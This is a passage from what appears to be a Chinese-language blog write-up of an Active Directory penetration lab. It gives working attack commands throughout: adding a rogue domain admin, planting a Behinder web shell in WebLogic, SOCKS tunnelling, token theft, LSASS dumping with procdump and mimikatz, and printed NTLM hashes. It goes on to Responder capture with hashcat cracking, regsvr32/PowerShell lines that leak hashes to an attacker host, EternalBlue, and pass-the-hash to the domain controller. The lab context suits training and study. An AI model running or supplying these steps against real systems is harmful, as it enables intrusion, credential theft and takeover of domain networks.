+<p>2、查看所有域</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure>
+
+<p>3、从计算机名获取ipv4地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -n 1 DC1 -4</span><br></pre></td></tr></table></figure>
+
+<p>4、查看域中的用户名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dsquery user</span><br><span class="line">net user /domain</span><br></pre></td></tr></table></figure>
+
+<p>5、查询域组名称</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure>
+
+<p>6、查询域管理员</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<p>7、添加域管理员账号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">添加普通域用户 </span><br><span class="line">net user lemon iam@L3m0n /add /domain </span><br><span class="line">将普通域用户提升为域管理员 </span><br><span class="line">net group &quot;Domain Admins&quot; lemon /add /domain</span><br></pre></td></tr></table></figure>
+
+<p><strong>8、查看当前计算机名，全名，用户名，系统版本，工作站域，登陆域</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config Workstation</span><br></pre></td></tr></table></figure>
+
+<p>9、查看域控制器(多域控制器的时候,而且只能用在域控制器上)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain controllers</span><br></pre></td></tr></table></figure>
+
+<p>10、查询所有计算机名称</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer </span><br><span class="line">下面这条查询的时候,域控不会列出 </span><br><span class="line">net group &quot;Domain Computers&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<p>11、net命令</p>
+<p>①映射磁盘到本地 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use z: \\dc01\sysvol</span><br></pre></td></tr></table></figure>
+
+<p>②查看共享 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view \\192.168.0.1</span><br></pre></td></tr></table></figure>
+
+<p>③开启一个共享名为app$，在d:\config</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share app$=d:\config</span><br></pre></td></tr></table></figure>
+
+<p>12、跟踪路由</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tracert 8.8.8.8</span><br></pre></td></tr></table></figure>
+
+<h3 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h3><p>1、查看域时间及域服务器的名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure>
+
+<p>2、ldap</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nslookup -type=SRV _ldap._tcp.</span><br></pre></td></tr></table></figure>
+
+<p>3、通过ipconﬁg配置查找dns地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/all</span><br></pre></td></tr></table></figure>
+
+<p>4、查询域控</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<p>判断出域为de1ay.com</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_16-53-17.png" alt></p>
+<h2 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h2><h3 id="http代理转发"><a href="#http代理转发" class="headerlink" title="http代理转发"></a>http代理转发</h3><p>上传代理</p>
+<p>首先找到weblogic的web路径<code>C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\</code>，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload E:\PenetrationTools\GithubTools\冰蝎_v2.0.1\server\shell.jsp</span><br><span class="line">shell dir</span><br><span class="line">shell copy C:\Oracle\Middleware\user_projects\domains\base_domain\shell.jsp C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\shell.jsp</span><br></pre></td></tr></table></figure>
+
+<p>冰蝎连接，成功访问，连接路径</p>
+<p><a href="http://192.168.111.80:7001/_async/shell.jspx" target="_blank" rel="noopener">http://192.168.111.80:7001/_async/shell.jspx</a></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_14-15-01.png" alt></p>
+<p>在这个地方<code>C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\</code>接着上传proxy jsp</p>
+<p>1.上传后在kali上执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -p 6666 -u http://192.168.111.80:7001/_async/tunnel.jsp</span><br></pre></td></tr></table></figure>
+
+<p>2.然后编辑proxychains配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
+
+<p>3.将<code>socks4 127.0.0.1 9095</code>改为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 6666</span><br></pre></td></tr></table></figure>
+
+<p>4.使用方法</p>
+<p>在需要代理的命令前加上 proxychains，如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -p 6666 -u http://192.168.111.80:7001/_async/tunnel.jsp</span><br></pre></td></tr></table></figure>
+
+<p>效果如下</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_14-20-42.png" alt></p>
+<p>缺点是扫描速度太慢</p>
+<h3 id="metasploit-proxychains"><a href="#metasploit-proxychains" class="headerlink" title="metasploit+proxychains"></a>metasploit+proxychains</h3><p>主要使用使用socks5辅助模块</p>
+<p>1.查看目标主机路由信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_15-04-27.png" alt></p>
+<p>2.添加路由(在 -s 前加-d是删除路由)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 10.10.10.0/24</span><br></pre></td></tr></table></figure>
+
+<p>3.查看路由信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+
+<p>4.设置好之后就使用socks5辅助模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use auxiliary/server/socks5</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 6666</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_15-30-17.png" alt></p>
+<p>5.proxychains代理扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<h3 id="Cobalt-Strike-socks代理"><a href="#Cobalt-Strike-socks代理" class="headerlink" title="Cobalt Strike socks代理"></a>Cobalt Strike socks代理</h3><p>前面两种方法在我ssh连接的情况下经常会<strong>连接超时</strong>，每次我都得打开meterpreter监听然后再用spawn重新派生一个shell到meterpreter，非常麻烦，最后一种方法试试cs自带的socks代理功能</p>
+<p>Cobalt Strike的最简单，ssh超时重连目标也不会掉。</p>
+<p>1.在beacon中输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt;socks 6666</span><br></pre></td></tr></table></figure>
+
+<p>2.配置proxychains.conf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks4 127.0.0.1 6666</span><br></pre></td></tr></table></figure>
+
+<p>3.或者直接开启隧道使用msf</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_16-01-09.png" alt></p>
+<p>4.msf输入命令后可以加载模块进行扫描（ms07-010）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks4:192.168.111.3:6666</span><br></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><em>这里虽然拿到的权限是Administrator权限的，但是还是想拓展下提权这一块</em></p>
+<h3 id="Metasploit中的incognito"><a href="#Metasploit中的incognito" class="headerlink" title="Metasploit中的incognito"></a>Metasploit中的incognito</h3><p>在Metasploit中，可使用incognito实现token窃取，常用命令如下：</p>
+<p>加载incognito：<code>load incognito</code></p>
+<p>列举token：<code>list_tokens -u</code></p>
+<p>查看当前token：<code>getuid</code></p>
+<p>提示至system权限：<code>getsystem</code></p>
+<p>token窃取：<code>impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</code></p>
+<p>从进程窃取：<code>steal_token 1252</code></p>
+<p>返回之前token：<code>rev2self</code> or <code>drop_token</code></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-16_14-02-34.png" alt></p>
+<h3 id="Windows中的incognito"><a href="#Windows中的incognito" class="headerlink" title="Windows中的incognito"></a>Windows中的incognito</h3><p>Metasploit中的incognito，是从windows平台下的incognito移植过来的，下面介绍一下windows平台下的incognito</p>
+<p><strong>下载地址：</strong></p>
+<p><a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip" target="_blank" rel="noopener">https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</a></p>
+<p>常见用法如下：</p>
+<p>列举token：<code>incognito.exe list_tokens -u</code></p>
+<p>复制token：<code>incognito.exe execute [options] &lt;token&gt; &lt;command&gt;</code></p>
+<p>提权至system：<code>incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe</code></p>
+<p>降权至当前用户：<code>incognito.exe execute -c &quot;WIN-R7MM90ERBMD\a&quot; cmd.exe</code></p>
+<p>伪造用户：<code>incognito.exe execute -c &quot;WIN-R7MM90ERBMD\b&quot; cmd.exe</code></p>
+<h3 id="Invoke-TokenManipulation-ps1用法"><a href="#Invoke-TokenManipulation-ps1用法" class="headerlink" title="Invoke-TokenManipulation.ps1用法"></a>Invoke-TokenManipulation.ps1用法</h3><p><strong>下载地址：</strong></p>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1</a></p>
+<p>原理和功能同incognito类似，能够实际提权和降权</p>
+<p>列举token：<code>Invoke-TokenManipulation -Enumerate</code></p>
+<p>提权至system：<code>Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -Username &quot;nt authority\system&quot;</code></p>
+<p>复制进程token：<code>Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -ProcessId 500</code></p>
+<p>复制线程token：<code>Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -ThreadId 500</code></p>
+<p>还有更多用法可参考该脚本说明</p>
+<h3 id="利用token获得TrustedInstaller权限"><a href="#利用token获得TrustedInstaller权限" class="headerlink" title="利用token获得TrustedInstaller权限"></a>利用token获得TrustedInstaller权限</h3><p>在Windows系统中，即使获得了管理员权限和system权限，也不能修改系统文件</p>
+<p>因为Windows系统的最高权限为<code>TrustedInstaller</code></p>
+<p>1.验证是否获得TrustedInstaller权限的方法</p>
+<p>对特殊路径写文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; C:\Windows\servicing\1.txt</span><br></pre></td></tr></table></figure>
+
+<p>使用powershell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Acl -Path C:\Windows\servicing\TrustedInstaller.exe |select Owner</span><br></pre></td></tr></table></figure>
+
+<p>使用whoami</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /groups | findstr TrustedInstaller</span><br></pre></td></tr></table></figure>
+
+<p>2.getsystem提升到system权限</p>
+<p>3.sc命令启动服务TrustedInstaller</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell sc start  trustedinstaller</span><br></pre></td></tr></table></figure>
+
+<p>4.ps命令找到TrustedInstaller的pid</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-16_14-42-52.png" alt></p>
+<p>5.使用incognito获取TrustedInstaller.exe的token</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steal_token TrustedInstall.exe的PID</span><br></pre></td></tr></table></figure>
+
+<p>6.写入文件成功，获得了<code>TrustedInstaller</code>权限</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-16_14-45-27.png" alt></p>
+<h2 id="密码读取"><a href="#密码读取" class="headerlink" title="密码读取"></a>密码读取</h2><h3 id="NTML-Hash"><a href="#NTML-Hash" class="headerlink" title="NTML-Hash"></a>NTML-Hash</h3><p>在NTLM认证中，NTLM响应分为<code>NTLMv1</code>，<code>NTLMv2</code>，<code>NTLM session v2</code>三种协议，不同协议使用不同格式的Challenge和加密算法</p>
+<p>所以也就存在不同协议的<code>Net-NTLM hash</code>，即<code>Net-NTLM v1 hash</code>，<code>Net-NTLM v2 hash</code></p>
+<p>从攻击角度来看</p>
+<ul>
+<li>可以利用NTLM哈希值进行“哈希传递”攻击</li>
+<li>无法利用Net-NTLM哈希值来进行“哈希传递”攻击</li>
+</ul>
+<h4 id="本地获取"><a href="#本地获取" class="headerlink" title="本地获取"></a>本地获取</h4><p>1.上传procdump64.exe和mimikatz</p>
+<p>2.使用procdump来先dump内存hash，保存为dmp文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<p>3.mimikatz对dump下来的hash进行破解</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit &gt; 1.txt</span><br></pre></td></tr></table></figure>
+
+<p>内容见文末</p>
+<blockquote>
+<p>在默认情况下，当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，此时可以通过以下方式开启，但需要用户重新登录后才能成功抓取。但是目标系统为Windows 2008(64)</p>
+</blockquote>
+<p>可以看到三个用户NTML-Hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username::hostname:LM response:NTLM response:challenge</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">de1ay:1000:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
+
+<p>通过分析收集的凭证，我们找到以下字段：用户名和由冒号分隔的两个字符串; 这两个代表该用户的加密密码。<br>使用散列算法存储Windows凭据：</p>
+<p>散列的第一部分表示<strong>LAN Manager（LM）散列</strong>。默认情况下，从Windows Vista和Windows Server 2008开始禁用LM身份验证协议，因为它确实不安全; 这就是为什么字符串“aad3b435b51404eeaad3b435b51404ee”<strong>代表一个空值</strong>（记住我们控制的是Windows Server 8的主机）。</p>
+<p>第二部分代表<strong>NT LAN Manager（NTLM）</strong>哈希：NTLM是LM协议的升级版本，但它仍然容易受到密码破解攻击。这就是我们可以使用密码破解工具<code>John The Ripper</code>的原因 在字典攻击模式下查找相应的明文密码，也可以在<a href="https://www.objectif-securite.ch/ophcrack" target="_blank" rel="noopener">ophcrack网站</a>，进行破解</p>
+<p>在Windows Server 2008 下是保存了明文密码的，如果是高于2008版本的需要进行解密。更多详情在ssooking表哥的<a href="https://ssooking.github.io/yu-shen-tou-zhi-ntml-hash/" target="_blank" rel="noopener">博客</a>有写。</p>
+<blockquote>
+<p><code>LM HASH</code>是一种较古老的Hash，在<code>LAN Manager</code>协议中使用，非常容易通过暴力破解获取明文凭据。Vista以前的Windows OS使用它，Vista之后的版本默认禁用了LM协议，但某些情况下还是可以使用。</p>
+<p><code>NTLM Hash（NT LAN Manager）</code>是支持<code>Net NTLM</code>认证协议及<code>本地认证</code>过程中的一个重要参数。其长度为32位，由数字与字母组成。它的前身是<code>LM Hash</code>，目前基本淘汰，两者相差不大，只是使用的加密算法不同。</p>
+<p><strong>本地认证</strong>：Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在<code>SAM (Security Account Manager Database，安全账号管理数据库)</code>中。SAM文件的路径是<code>%SystemRoot%\system32\config\sam</code>。在进行本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成NTLM Hash，与SAM数据库中的NTLM Hash进行比较，从而实现认证。</p>
+</blockquote>
+<p>使用cs的<code>logonpasswords</code>功能dmup明文密码，相当于把上面的<code>procdump64</code>读取内存+<code>mimikatz</code>破解哈希两步结合了，一把梭。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_19-44-39.png" alt></p>
+<h3 id="Net-NTLM-hash"><a href="#Net-NTLM-hash" class="headerlink" title="Net-NTLM hash"></a>Net-NTLM hash</h3><h4 id="网络欺骗"><a href="#网络欺骗" class="headerlink" title="网络欺骗"></a>网络欺骗</h4><p><em>这一步是通关靶场后进行的</em></p>
+<p>使用<strong>Responder</strong>伪造服务，对相关请求进行响应。开启命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0</span><br></pre></td></tr></table></figure>
+
+<p>实战环境下，我们应该修改<code>/etc/responder/Responder.conf</code>配置文件，关闭其中的一些不必要的服务，从而减少网络流量，并产生针对性日志，如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">; Servers to start</span><br><span class="line">SQL = Off</span><br><span class="line">SMB = On</span><br><span class="line">Kerberos = On</span><br><span class="line">FTP = Off</span><br><span class="line">POP = Off</span><br><span class="line">SMTP = Off</span><br><span class="line">IMAP = Off</span><br><span class="line">HTTP = On</span><br><span class="line">HTTPS = On</span><br><span class="line">DNS = On</span><br><span class="line">LDAP = On</span><br></pre></td></tr></table></figure>
+
+<p>针对测试而言，我们还可以设置<code>Challenge</code>值，以便观察流量格式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Challenge = 1122334455667788</span><br></pre></td></tr></table></figure>
+
+<p>开启监听后，当用户进行了交互，如在资源管理器中以<code>UNC</code>路径形式访问伪造的服务器：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_19-58-06.png" alt></p>
+<p>此时会弹出虚假认证界面，此时无论受害者是否输入凭据，我们都已经获取了<code>NET NTML Hash</code>。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_19-59-04.png" alt></p>
+<p><code>responder</code>默认会将日志保存在<code>/usr/share/responder/logs</code>下，hash记录文件以<code>HTTP-NTLMv2</code> <code>SMBv2-NTLMv2</code>等前缀开头。</p>
+<p><strong>hashcat解密</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -m 5600 SMBv2-NTLMv2-SSP-192.168.111.80.txt hashpass.txt -o success.txt --force</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-m 破解hash类型</li>
+<li>-a 破解模式（0 1 3 6 7）</li>
+<li>-o 输出文档</li>
+<li>–force代表强制执行，测试系统不支持Intel OpenCL</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-14_23-22-48.png" alt></p>
+<p>在渗透测试中，我们还可以通过其他技巧获取<code>Net-NTML Hash</code>，如：</p>
+<ul>
+<li>命令执行：<code>regsvr32</code>、<code>powershell</code>等</li>
+<li>钓鱼文档：doc、docx、pdf</li>
+<li>后门设置：</li>
+</ul>
+<p>例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /s /u /i://17.10.0.1/@abc hello.dll</span><br><span class="line"></span><br><span class="line">powershell -c &quot;Invoke-Item \\17.10.0.1\aa&quot;</span><br><span class="line">powershell -nop -exec bypass -c &quot;Invoke-Item \\17.10.0.1\aa&quot;</span><br><span class="line">Invoke-Item \\192.168.0.1\aa</span><br><span class="line">Get-Content \\192.168.0.1\aa</span><br><span class="line">Start-Process \\192.168.0.1\aa</span><br></pre></td></tr></table></figure>
+
+<h3 id="计算机密码"><a href="#计算机密码" class="headerlink" title="计算机密码"></a>计算机密码</h3><p>该<strong>LaZagne项目</strong>是用于开源应用程序<strong>获取大量的密码</strong>存储在本地计算机上。每个软件都使用不同的技术（纯文本，API，自定义算法，数据库等）存储其密码。开发该工具的目的是为最常用的软件找到这些密码。</p>
+<p>工具地址：<a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p>
+<p>Cobalt Strike 上传LaZagne，查看是否可以读取到其他密码信息</p>
+<p>没有密码信息..</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] 0 passwords have been found.</span><br></pre></td></tr></table></figure>
+
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h3 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">msf auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 10.10.10.10</span><br><span class="line">msf auxiliary(scanner/smb/smb_ms17_010) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p>可设置扫描段 <code>set RHOSTS 10.10.10.0/24</code></p>
+<p>探测存在永恒之蓝漏洞</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_22-11-59.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/ms17_010_eternalblue </span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; set rhost 10.10.10.10</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 10.10.10.80</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p>没打成功，试试域中另一个用户<code>10.10.10.201</code>也没能成功</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_22-26-38.png" alt></p>
+<h3 id="Pass-the-Hash"><a href="#Pass-the-Hash" class="headerlink" title="Pass the Hash"></a>Pass the Hash</h3><p>SMB的认证可以基于NTLM协议或者kerberos协议，前者使用了hash，后者使用了ticket，是构成SMB的<code>PtH</code>和<code>PtT</code>攻击的基础。</p>
+<p>NTLM 并没有定义它所依赖的传输层协议。NTLM 消息的传输完全依赖于使用 NTLM 的上层协议来决定，可以是SMB，也可以是TCP，亦或HTTP。</p>
+<p>pass-the-hash在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。</p>
+<p>这类攻击适用于：</p>
+<ul>
+<li>域/工作组环境</li>
+<li>可以获得hash,但是条件不允许对hash爆破</li>
+<li>内网中存在和当前机器相同的密码</li>
+</ul>
+<p>1.查看当前计算机名，全名，用户名，系统版本，工作站域，登陆域</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config Workstation</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_13-34-24.png" alt></p>
+<p>2.查找域控</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_13-36-10.png" alt></p>
+<p>3.这里使用的是cs的pth模块进行，使用mimikatz传递hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth domain\user NTLM</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_13-25-57.png" alt></p>
+<p>4.成功访问域控资源</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc.de1ay.com\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_13-48-45.png" alt></p>
+<h3 id="Pass-the-Ticket"><a href="#Pass-the-Ticket" class="headerlink" title="Pass the Ticket"></a>Pass the Ticket</h3><p><em>这一步作为拓展</em></p>
+<p>PtT攻击的部分就不是简单的ntlm认证了，它是利用Kerberos协议进行攻击的，三种常见的攻击方法：<em>MS14-068</em>,<em>Golden ticket</em>,<em>SILVER TICKET</em>.</p>
+<p>关于Ticket在这边文章上写的非常清楚：<a href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Ticket.html" target="_blank" rel="noopener">域渗透-Ticket</a></p>
+<p>关于Kerberos：<a href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos.html" target="_blank" rel="noopener">域渗透-Kerberos</a></p>
